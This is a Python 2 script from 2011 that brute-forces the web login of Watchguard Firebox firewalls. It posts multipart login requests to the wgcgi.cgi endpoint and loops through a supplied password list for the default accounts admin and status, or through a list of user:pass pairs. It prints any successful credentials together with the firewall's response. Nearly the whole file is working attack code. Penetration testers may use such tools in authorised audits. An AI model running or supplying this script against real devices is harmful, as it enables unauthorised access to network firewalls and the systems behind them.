#!/usr/bin/python
# Copyright 2011 Stephen Haywood aka AverageSecurityGuy
#
#   This program is free software: you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation, either version 3 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# firewarebf.py attempts to bruteforce the password on a Watchguard firewall.

import poster
import urllib2
import ssl
import re
import argparse

#-----------------------------------------------------------------------------
# Functions
#-----------------------------------------------------------------------------
def list_from_file(filename):
    tmp = []
    try:
        f = open(filename, 'r')
    except:
        print "Could not open file: %s" % f.name()

    for line in f:
        tmp.append(line.rstrip('\r\n'))

    return tmp
    
def check_user_pass(url, user, pwd, domain):
    site = url + '/wgcgi.cgi?action=fw_logon&style=fw_logon.xsl&fw_logon_type=status'
    values = {'submit' : 'Login',
              'action' : 'fw_logon',
              'style' : 'fw_logon_progress.xsl',
              'fw_logon_type' : 'logon'}
              
    values['fw_username'] = user
    values['fw_password'] = pwd
    values['fw_domain'] = domain
	
    datagen, headers = poster.encode.multipart_encode(values)
    req = urllib2.Request(site, datagen, headers)
    resp = urllib2.urlopen(req).read()
    if re.search('Authentication Failed:', resp):
        print "Failed: %s, %s" % (u, p)
    else:
        print resp
        print "Success: %s, %s" % (u, p)


#-----------------------------------------------------------------------------
# Main Program
#-----------------------------------------------------------------------------
# Setup poster module
poster.streaminghttp.register_openers()

#Parse command line arguments using argparse
desc = """firewarebf.py attempts to bruteforce the password on a Watchguard
firewall. You will need to provide the IP address of the firewall, the login 
domain, and the login credentials to test.
"""
parser = argparse.ArgumentParser(description=desc)
parser.add_argument('server', action='store', default='192.168.0.1',
                    help="Ip address of server (Default: 192.168.0.1)")

passgroup = parser.add_mutually_exclusive_group(required=True)
passgroup.add_argument('-p', action='store', default=None, metavar='passfile',
    help='List of passwords. Will use default usernames of admin and status.')
passgroup.add_argument('-f', action='store', default=None,
                       metavar='userpassfile',
                       help='List of user:pass combinations.')

parser.add_argument('-d', action='store', default='Firebox-DB',
                   metavar='domain', help='Login domain (Default: Firebox-DB')
parser.add_argument('--http', action='store_true', default=False,
                    help='Use an HTTP connection instead of HTTPS')

args = parser.parse_args()

# Set the URL based on --http flag
if args.http:
    url = "http://" + args.server
else:
    url = "https://" + args.server
    
# Test the passwords
if args.f:
    for c in list_from_file(args.f):
        u, p = c.split(":")
        check_user_pass(url, u, p, args.d)
else:
    users = ['admin', 'status']
    pwds = list_from_file(args.p)
    for u in users:
        for p in pwds:
            check_user_pass(url, u, p, args.d)

